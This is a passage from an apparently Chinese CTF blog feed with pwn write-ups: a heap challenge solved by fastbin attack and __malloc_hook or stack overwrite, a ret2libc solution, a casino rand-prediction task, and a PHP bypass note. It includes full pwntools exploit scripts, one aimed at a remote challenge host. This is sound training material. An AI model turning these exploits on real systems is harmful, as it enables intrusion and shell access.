class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">    保护： </span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br><span class="line">int add_book()</span><br><span class="line">&#123;</span><br><span class="line">  size_t size; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  for ( HIDWORD(size) = 0; HIDWORD(size) &lt;= 0xF &amp;&amp; ptr[5 * HIDWORD(size)]; ++HIDWORD(size) )</span><br><span class="line">    ;</span><br><span class="line">  if ( HIDWORD(size) == 16 )</span><br><span class="line">    puts(&quot;Too many books&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  puts(&quot;What is the author name?&quot;);</span><br><span class="line">  readn(0x28LL * HIDWORD(size) + 0x602060, 0x1F);</span><br><span class="line"></span><br><span class="line">  puts(&quot;How long is the book name?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;size);</span><br><span class="line"></span><br><span class="line">  if ( (unsigned int)size &gt; 0x50 )</span><br><span class="line">    return puts(&quot;Too big!&quot;);</span><br><span class="line">  ptr[5 * HIDWORD(size)] = malloc((unsigned int)size);</span><br><span class="line">  puts(&quot;What is the name of the book?&quot;);</span><br><span class="line">  readn(ptr[5 * HIDWORD(size)], size);          // size==0 时，溢出</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 漏洞函数</span><br><span class="line">__int64 __fastcall readn(__int64 a1, int len)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned int v3; // eax</span><br><span class="line">  unsigned __int8 buf; // [rsp+1Bh] [rbp-5h]</span><br><span class="line">  unsigned int v5; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v5 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (unsigned int)(len - 1);</span><br><span class="line">    if ( (unsigned int)result &lt;= v5 )</span><br><span class="line">      break;</span><br><span class="line">    read(0, &amp;buf, 1uLL);</span><br><span class="line">    result = buf;</span><br><span class="line">    if ( buf == &apos;\n&apos; )</span><br><span class="line">      break;</span><br><span class="line">    v3 = v5++;</span><br><span class="line">    *(_BYTE *)(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int sellbook()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Which book do you want to sell?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;idx);</span><br><span class="line">  if ( idx &gt; 0x10 )</span><br><span class="line">    return puts(&quot;Out of bound!&quot;);</span><br><span class="line">  if ( !ptr[5 * idx] )                          // ptr as inuse</span><br><span class="line">    return puts(&quot;No such book!&quot;);</span><br><span class="line">  free((void *)ptr[5 * idx]);</span><br><span class="line">  ptr[5 * idx] = 0LL;                           // ptr=0</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int readbook()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int idx; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  puts(&quot;Which book do you want to sell?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;idx);</span><br><span class="line">  if ( idx &gt; 0x10 )</span><br><span class="line">    return puts(&quot;Out of bound!&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  if ( ptr[5 * idx] )                           // 检查ptr</span><br><span class="line">    return printf(&quot;Author:%s\nBookname:%s\n&quot;, 0x28LL * idx + 0x602060, ptr[5 * idx]);    -&gt;%s泄漏信息</span><br><span class="line">  return puts(&quot;No such book!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>在输入size为0时readn函数漏洞，此时可以输入无限长度，可以溢出。结合readbook函数可以泄露堆地址；</p><p>fastbin attack将chunk分配到bss段存储指针及author name的地方，修改指针为某一函数got地址计算得到libc基址。</p><p>之后就需要getshell了，想法有：</p><ol><li>写got表，但是full relro，所以不行；</li><li>复写malloc_hook或free_hook,这个尝试了半天，因为在malloc_hook附近分配时需要用0x7f绕过大小检查，但是用户自己申请的大小最大为0x50，最终size最大便是0x60，于是想直接在bss段伪造0x70大小的chunk，并free掉，但是坑爹的是bss段一共就只有0x7f大小。。。最终放弃；</li><li>无奈之下，尝试将chunk分配到栈中覆盖返回地址，终于getshell！！</li></ol><p>从出题的学长那里学到了另一种思路</p><ol><li>利用fastbin attack将一个伪造的size作为fd放入fastbinY中，而该指针会在main_arena 处存放，然后我们可以将其作为fakechunk的size，将chunk分配到main_arena处</li><li>分配过去之后，就可以修改main_arena处存放的top chunk地址，此时将top chunk地址提到malloc hook之上，再次申请一个chunk，如果选择的size在fastbinY中不存在，那么便会从topchunk中切割，也就会分配到malloc hook之上</li><li>修改最后一个chunk的内容即修改malloc hook的值</li></ol><h2 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">#sh= process(&apos;./book&apos;)#[&apos;./book&apos;],env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.23.so&quot;&#125;)</span><br><span class="line">sh =remote(&apos;159.65.68.241&apos;,&apos;10004&apos;)</span><br><span class="line">elf = ELF(&apos;./book&apos;)</span><br><span class="line">libc = ELF(&apos;libc-2.23.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(a_name,size,b_name):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.recvuntil(&apos;author name?\n&apos;)</span><br><span class="line">sh.sendline(a_name)</span><br><span class="line">sh.recvuntil(&apos;book name?\n&apos;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&apos;book?\n&apos;)</span><br><span class="line">sh.sendline(b_name)</span><br><span class="line"></span><br><span class="line">def read(idx):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;3&apos;)</span><br><span class="line">sh.recvuntil(&apos;sell?\n&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">sh.recvuntil(&apos;Your choice:\n&apos;)</span><br><span class="line">sh.sendline(&apos;2&apos;)</span><br><span class="line">sh.recvuntil(&apos;sell?\n&apos;)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;)</span><br><span class="line">add(&apos;c&apos;,0,&apos;d&apos;)</span><br><span class="line">add(&apos;e&apos;,0,&apos;f&apos;)</span><br><span class="line">add(&apos;g&apos;,0,&apos;h&apos;)</span><br><span class="line">add(&apos;i&apos;,0,&apos;j&apos;)</span><br><span class="line">#--------leak heap_base-----------------#</span><br><span class="line">delete(2)</span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0)+p64(0x21),0,&apos;b&apos;*0x20)</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;b&apos;*0x20)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))-0x40</span><br><span class="line">print &apos;heap_base : &apos;+hex(heap_base)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#---------fastbin_attack leak libc_base-----------------#</span><br><span class="line">delete(4)</span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;A&apos;,0,&apos;b&apos;*0x10+p64(0)+p64(0x21)+p64(0x602060))</span><br><span class="line">add(&apos;f&apos;,0,&apos;wwwwwwww&apos;)</span><br><span class="line">add(&apos;a&apos;,0,&apos;a&apos;*0x10+p64(elf.got[&apos;puts&apos;]))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">puts_got = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))</span><br><span class="line">libc_base = puts_got- libc.symbols[&apos;puts&apos;]</span><br><span class="line">print &apos;libc_base : &apos;+hex(libc_base) </span><br><span class="line">environ_ptr_addr = libc_base + libc.symbols[&apos;_environ&apos;]</span><br><span class="line">print &apos;environ_ptr_addr : &apos;+ hex(environ_ptr_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">#---------get shell-------------------------------#</span><br><span class="line">one_gadget_off = 0x45216</span><br><span class="line">one_gadget_addr = one_gadget_off + libc_base</span><br><span class="line">malloc_hook_addr = libc_base + 0x3c4b10</span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(environ_ptr_addr))</span><br><span class="line">read(0)</span><br><span class="line">sh.recvuntil(&apos;name:&apos;)</span><br><span class="line">environ_addr = u64(sh.recvuntil(&apos;\n&apos;).strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))</span><br><span class="line">rbp_addr = environ_addr-0xf8</span><br><span class="line">print &apos;one_gadget_addr : &apos;+hex(one_gadget_addr)</span><br><span class="line">print &apos;malloc_hook_addr : &apos;+hex(malloc_hook_addr)</span><br><span class="line">print &apos;rbp_addr : &apos;+hex(rbp_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+&apos;c&apos;*0x20+p64(0x6020b0)+&apos;d&apos;*0x10+p64(0x21))</span><br><span class="line">delete(2)</span><br><span class="line">delete(0)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;a&apos;,0,&apos;b&apos;*0x10+p64(0x602070)+p64(0x21)+&apos;b&apos;*0x18+p64(0x41)+p64(rbp_addr-0x1e))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;\n&apos;,0x30,&apos;\n&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;c&apos;,0x30,&apos;a&apos;*0x16+p64(one_gadget_addr))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;4&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&quot;./book&quot;)</span><br><span class="line">#p=remote(&quot;159.65.68.241&quot;,&quot;10004&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;,checksec=False)</span><br><span class="line">malloc_hook = libc.symbols[&quot;__malloc_hook&quot;]</span><br><span class="line">def add(name,size,content):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">    p.sendlineafter(&quot;name?&quot;,name)</span><br><span class="line">    p.sendlineafter(&quot;name?&quot;,str(size))</span><br><span class="line">    p.sendlineafter(&quot;book&quot;,content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,&quot;2&quot;)</span><br><span class="line">    p.sendlineafter(&quot;sell?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">def read(index):</span><br><span class="line">    p.sendlineafter(&quot;choice:&quot;,&quot;3&quot;)</span><br><span class="line">    p.sendlineafter(&quot;sell?&quot;,str(index))</span><br><span class="line"></span><br><span class="line">code = ELF(&quot;./book&quot;,checksec=False)</span><br><span class="line">puts_got = code.got[&quot;puts&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&quot;1&quot;,0,&quot;a&quot;)      #0</span><br><span class="line">add(&quot;2&quot;,0x40,&quot;b&quot;)  #1</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #2</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(0)</span><br><span class="line"></span><br><span class="line">add(p64(0x51)*2,0,&quot;a&quot;*0x18+p64(0x51)+p64(0x602060))  #0</span><br><span class="line">add(&quot;b&quot;,0x40,&quot;b&quot;)        #1</span><br><span class="line">add(&quot;c&quot;,0x40,&quot;c&quot;*0x10+p64(puts_got))  #3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(0)</span><br><span class="line">p.recvuntil(&quot;name:&quot;)</span><br><span class="line">puts_addr = p.recv(6)+&quot;\x00&quot;*2</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.symbols[&quot;puts&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">print(&quot;-------------------&quot;)</span><br><span class="line"></span><br><span class="line">add(&quot;d&quot;,0,&quot;d&quot;)       #4</span><br><span class="line">add(&quot;e&quot;,0x50,&quot;e&quot;)    #5</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #6</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">delete(5) </span><br><span class="line">delete(4)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(&quot;d&quot;,0,&quot;d&quot;*0x18+p64(0x61)+p64(0x51)+&quot;123&quot;)  #4</span><br><span class="line">add(&quot;e&quot;,0x50,&quot;e&quot;)    #5</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;g&quot;,0,&quot;d&quot;)       #6</span><br><span class="line">add(&quot;h&quot;,0x40,&quot;e&quot;)    #7</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;fence&quot;,0,p64(0xdeadbeef))  #8</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">delete(8)</span><br><span class="line">delete(7)</span><br><span class="line"></span><br><span class="line">add(&quot;g&quot;,0,&quot;g&quot;*0x18+p64(0x51)+p64(libc_base+0x3c4b40)+&quot;123&quot;)  #8</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;h&quot;,0x40,&quot;g&quot;)   #7</span><br><span class="line">print hex(libc_base+0x3c4b40)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;i&quot;,0x40,p64(0)*5+p64(libc_base+0x3c4b00))  #9</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add(&quot;exp&quot;,0,p64(libc_base+0x4526a))   #10</span><br><span class="line">print hex(libc_base+0x4526a)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;choice:&quot;, &quot;1&quot;)</span><br><span class="line">p.sendlineafter(&quot;name?&quot;,&quot;aaa&quot;)</span><br><span class="line">p.sendlineafter(&quot;name?&quot;,&quot;0&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;华科一个新战队的招新题，正好最近没有兴致继续下去，来玩一玩招新题&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;stack&quot;&gt;&lt;a href=&quot;#stack&quot; class=&quot;headerlink&quot; title=&quot;stack&quot;&gt;&lt;/a&gt;stack&lt;/h1&gt;&lt;p&gt;最简单的栈溢出&lt;/
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
      <category term="stack" scheme="http://siriuswhiter.tk/tags/stack/"/>
    
  </entry>
  
  <entry>
    <title>Fun with PHP Code Audit</title>
    <link href="http://siriuswhiter.tk/2019/01/31/fun-with-php-code-audit/"/>
    <id>http://siriuswhiter.tk/2019/01/31/fun-with-php-code-audit/</id>
    <published>2019-01-31T07:47:31.000Z</published>
    <updated>2019-01-31T08:07:35.604Z</updated>
    
    <content type="html"><![CDATA[<p><em>pwn的头疼＋心累，玩一玩入门的PHP代码审计</em></p><h1 id="基础传参"><a href="#基础传参" class="headerlink" title="基础传参"></a>基础传参</h1><p>从最基本的来说，常用的网页传参即 GET 与 POST<br>对于用户来讲，GET传参就是往网页链接后面直接添加参数，比如说<a href="https://test.php?a=1" target="_blank" rel="noopener">https://test.php?a=1</a>;<br>而POST传参一般需要写个脚本或者使用插件，比如说火狐浏览器的hackbar插件。</p><h1 id="简单的PHP函数检测绕过"><a href="#简单的PHP函数检测绕过" class="headerlink" title="简单的PHP函数检测绕过"></a>简单的PHP函数检测绕过</h1><ol><li>is_numeric: 检测是否为数字，但是如果输入 数字＋字母 （1ab）便能过检测，但是 php中 1ab ==1 为true</li><li>extract： 从数组中将变量导入到当前的符号表。使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。 但一般若设置为空，则有希望通过判断</li><li>对于数字之间的比较，通常可以使用数组来绕过，比如说 strcmp，strpos，MD5 ，sha1 等对两个用户输入字符串比较的，都可以使用数组尝试</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;pwn的头疼＋心累，玩一玩入门的PHP代码审计&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;基础传参&quot;&gt;&lt;a href=&quot;#基础传参&quot; class=&quot;headerlink&quot; title=&quot;基础传参&quot;&gt;&lt;/a&gt;基础传参&lt;/h1&gt;&lt;p&gt;从最基本的来说，常用的网页传参即 GET 与
      
    
    </summary>
    
      <category term="web" scheme="http://siriuswhiter.tk/categories/web/"/>
    
    
      <category term="web" scheme="http://siriuswhiter.tk/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>fireshell-2019-pwn</title>
    <link href="http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/"/>
    <id>http://siriuswhiter.tk/2019/01/29/fireshell-2019-pwn/</id>
    <published>2019-01-29T09:09:33.000Z</published>
    <updated>2019-02-08T06:52:36.780Z</updated>
    
    <content type="html"><![CDATA[<p><em>本来在之前没搞完的jarvisOJ那边遇到了问题，想问学长来着，结果被拉过来看看这个比赛，被自己菜哭</em></p><h1 id="leakless"><a href="#leakless" class="headerlink" title="leakless"></a>leakless</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">char buf; // [esp+0h] [ebp-48h]</span><br><span class="line">return read(0, &amp;buf, 0x100u);</span><br></pre></td></tr></table></figure><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>一个简单的栈溢出，第一反应是去泄露libc版本，后面又突然想着把shellcode写到bss段，但是奈何总是不成功，vmmap才发现bss段不可执行，且不存在能够wx的段，因为以前用LibcSearcher没成功（ps:完全不记得为什么），偏偏用DynElf爆破失败，所以还是转向LibcSearcher.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./leakless&apos;)</span><br><span class="line">libc = ELF(&apos;./leakless&apos;)</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(libc.symbols[&apos;puts&apos;])+p32(libc.symbols[&apos;feedme&apos;]) +p32(libc.got[&apos;puts&apos;])</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">puts_got_addr = u32(sh.recv(4))</span><br><span class="line">print &quot;puts_got_addr: &quot;+hex(puts_got_addr)</span><br><span class="line"></span><br><span class="line">obj = LibcSearcher(&quot;puts&quot;,puts_got_addr)</span><br><span class="line"></span><br><span class="line">system_addr = puts_got_addr - obj.dump(&apos;puts&apos;)+obj.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = puts_got_addr - obj.dump(&apos;puts&apos;) + obj.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"> </span><br><span class="line">success( &quot;system_addr: &quot;+hex(system_addr))</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh_addr))</span><br><span class="line"></span><br><span class="line">pay = &apos;a&apos;*0x48 + &apos;bbbb&apos; + p32(system_addr) + p32(libc.symbols[&apos;main&apos;]) + p32(binsh_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h1 id="casino"><a href="#casino" class="headerlink" title="casino"></a>casino</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>用户输入的值与随机数匹配成功100次，之后会读取flag.txt文件并输出。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">seed = (unsigned int)time(0LL) / 10;</span><br><span class="line">seed += bet;(bet=1)</span><br><span class="line">srand(seed);</span><br><span class="line">rand();</span><br></pre></td></tr></table></figure><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>格式化字符串漏洞，但是大小限制在了0x10，能够泄露出来seed，也就能预测第一次的值，然后因为要泄露100次，想着顺便把栈上的记录次数的值或者bet一起改掉，但是因为长度限制，最后有点懵。感觉二者不可得兼。</p><p>看大佬们的wp，因为seed是用time(0)/10+ bet ,可以先自己先利用time将seed计算出来，然后计算rand();因为python和c的rand()不同，所以得考虑如何将在python脚本中计算c的随机数，可以有：</p><ol><li>单独写一份c的程序计算随机数，脚本中调用c程序(昨天也是这么做的)； </li><li>使用python和c的混合编程包：ctypes。</li></ol><p>经实践，同一个seed得到的随机数序列都是一样的…，而题中通过time(0)/10对seed给了容错</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from time import *</span><br><span class="line"></span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line"></span><br><span class="line">now=int(time())/10+2</span><br><span class="line"></span><br><span class="line">sh=process(&quot;./timerand&quot;)</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span 